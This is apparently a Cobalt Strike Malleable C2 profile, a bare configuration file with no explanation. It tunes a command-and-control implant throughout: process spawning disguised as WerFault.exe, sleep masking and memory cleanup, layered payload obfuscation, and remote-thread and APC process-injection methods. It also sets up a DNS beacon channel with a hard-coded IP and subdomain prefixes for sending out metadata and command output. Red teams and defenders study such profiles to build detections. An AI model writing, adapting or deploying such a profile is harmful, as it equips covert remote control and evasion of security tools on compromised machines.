set sleeptime "60000";
set jitter "0";
set spawnto_x86 "%windir%\syswow64\WerFault.exe";
set spawnto_x64 "%windir%\sysnative\WerFault.exe";

http-get {
    set uri "/api/v1/Updates";
    set verb "GET";
}

http-post {
    set verb "POST";
}

stage {
    set cleanup "1";
    set data_store_size "16";
    set sleep_mask "1";

    beacon_gate {
        VirtualAllocEx;
        InternetConnectA;
        VirtualAlloc;
    }

    transform-obfuscate {
        base64;
        xor "64";
        rc4 "128";
        lznt1;
    }
}

process-inject {
    set startrwx "true";
    set userwx "false";
    set min_alloc "16384";

    transform-x86 {
        append "\x90\x90";
    }

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart";
        SetThreadContext;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
    set allocator "VirtualAllocEx";
    set bof_reuse_memory "true";
    set bof_allocator "VirtualAlloc";
}

dns-beacon {
    set maxdns "255";
    set dns_idle "162.221.159.145";
    set dns_sleep "0";
    set beacon "doc.bc.";
    set get_A "cdn.";
    set get_AAAA "www6.";
    set get_TXT "api.";
    set put_metadata "doc.md.";
    set put_output "doc.po.";
}
